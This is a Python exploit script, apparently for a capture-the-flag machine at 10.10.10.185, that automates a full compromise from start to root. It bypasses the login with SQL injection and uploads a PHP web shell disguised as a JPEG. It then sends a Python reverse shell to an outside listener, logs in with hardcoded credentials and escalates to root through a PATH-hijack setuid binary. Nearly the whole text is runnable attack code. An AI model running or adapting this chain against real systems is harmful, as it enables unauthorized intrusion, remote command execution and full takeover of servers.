# -*- coding: latin-1 -*-
# author script1337x
import os
import requests
import sys
import threading
from pwn import *
from termcolor import colored

target = "10.10.10.185"
url = "http://" + target + "/"

r3 = requests.session()


banner = r"""

                   .
         /^\     .
    /\   "V"
   /__\   I      O  o
  //..\\  I     .
  \].`[/  I
  /l\/j\  (]    .  O
 /. ~~ ,\/I          .
 \\L__j^\/I       o
  \/--v}  I     o   .
  |    |  I   _________
  |    |  I c(`       ')o
  |    l  I   \.     ,/
_/j  L l\_!  _//^---^\\_    -
                      coded by script1337
                      github : https://github.com/ScRiPt1337
"""
def printfc(text, color):
    if color == "red":
        print(colored(text, 'green'))
    if color == "green":
        print(colored(text, 'red'))
    if color == "yellow":
        print(colored(text, 'yellow'))

os.system("clear")
printfc(banner,"yellow")

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Cyberfox/52.9.1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://10.10.10.185/login.php",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "57",
}

upload_header = {
    "Host": "10.10.10.185",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Cyberfox/52.9.1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://10.10.10.185/upload.php",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "multipart/form-data; boundary=---------------------------3791216223201",
    "Content-Length": "501",
}

try:
    code = "\n<?php passthru($_REQUEST['cmd'], $result); ?>"
    payload = "echo '\xff\xd8\xff\xdb' > script1337.php"
    os.system(payload)
    f = open("script1337.php", "a")
    f.write(code)
    f.close()
    f = open("script1337.php", "r")
    webshell_code = f.read()
    f.close()
except:
    print("cant file php web shell")
    sys.exit()

web_shell = r"""
-----------------------------3791216223201
Content-Disposition: form-data; name="image"; filename="script1337.php.jpg"
Content-Type: application/octet-stream

{webshell_code}
-----------------------------3791216223201
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------3791216223201--

""".format(webshell_code=webshell_code)


def get_revershell():
    revese_payload = r"""http://10.10.10.185/images/uploads/script1337.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.87%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
    """
    r3.get(revese_payload, headers=header)


def root():
    global header, url, web_shell, upload_header, target
    creds = "username=' or ''='&password=' or ''='"
    login = url + "login.php"
    upload = url + "upload.php"
    r3.post(login, data=creds, headers=header)
    log.info("Attack Start... ")
    r3.post(upload, data=web_shell, headers=upload_header)
    log.info("sending payload")
    t1 = threading.Thread(target=get_revershell)
    t1.start()
    log.debug("Waiting for shell... ")
    pwn = listen(4444)
    svr = pwn.wait_for_connection()
    svr.recvuntil("/bin/sh: 0: can't access tty; job control turned off")
    svr.recv()
    log.debug("Sending stage 1 ....")
    svr.sendline('python3 -c \'import pty; pty.spawn("/bin/sh")\'')
    svr.recv()
    #svr.sendline('/usr/bin/mysqldump --databases Magic -u theseus -p')
    #svr.sendline('iamkingtheseus')
    svr.sendline('su theseus')
    svr.recv()
    svr.sendline('Th3s3usW4sK1ng')
    svr.recv()
    svr.sendline('echo "int main(int argc, char **argv) {setuid(0);system(\\"/bin/sh -i\\");return 0;}" > /tmp/script1337.c')
    svr.sendline('gcc /tmp/script1337.c -o /tmp/lshw')
    svr.sendline('cd /tmp')
    svr.sendline(r'PATH=.:\${PATH}')
    svr.sendline('export PATH')
    log.info("Sending stage 2 ....")
    svr.sendline('/bin/sysinfo')
    log.success("GOT ROOT....")
    svr.interactive()

root()

